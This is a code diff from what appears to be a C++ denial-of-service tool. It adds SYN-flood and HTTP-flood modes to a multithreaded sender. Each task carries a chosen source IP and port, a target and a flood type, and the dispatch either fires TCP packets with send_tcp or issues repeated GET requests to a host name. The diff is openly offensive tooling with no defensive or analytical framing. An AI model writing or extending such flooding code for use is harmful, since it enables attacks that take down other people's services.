@@ -6,7 +6,10 @@
 #include <future>
 #include <unordered_map>
 #include "tbb/concurrent_unordered_set.h"
-#include "tcp_send.h"
+#include "packet_sending.h"
+
+#define SYN_FLOOD 1
+#define HTTP_FLOOD 2
 
 struct src_dst
 {
@@ -14,12 +17,14 @@ struct src_dst
     const char* source_port;
     const char* dest_ip;
     const char* dest_port;
+    int flood_type;
+    const char* host_name;
 };
 
 class thread_pool
 {
 public:
-    TCPSend send;
+    packet_sending send;
 
     explicit thread_pool(int threads) : send()
     {
@@ -56,7 +61,7 @@ public:
     {
         {
             std::unique_lock<std::mutex> lock{event_mutex};
-            src_dst poison;
+            src_dst poison{};
             poison.source_port = nullptr;
             tasks_per_thread[thread_num].push_front(poison);
         }
@@ -124,7 +129,13 @@ private:
                             sleep(pause_between_send);
                         }
                     }
-                    send.send_tcp(ips_ports.source_ip, ips_ports.source_port, ips_ports.dest_ip, ips_ports.dest_port);
+                    if (ips_ports.flood_type == SYN_FLOOD)
+                    {
+                        send.send_tcp(ips_ports.source_ip, ips_ports.source_port, ips_ports.dest_ip, ips_ports.dest_port);
+                    } else if (ips_ports.flood_type == HTTP_FLOOD)
+                    {
+                        send.send_get_request(ips_ports.host_name);
+                    }
                 }
             });
         }
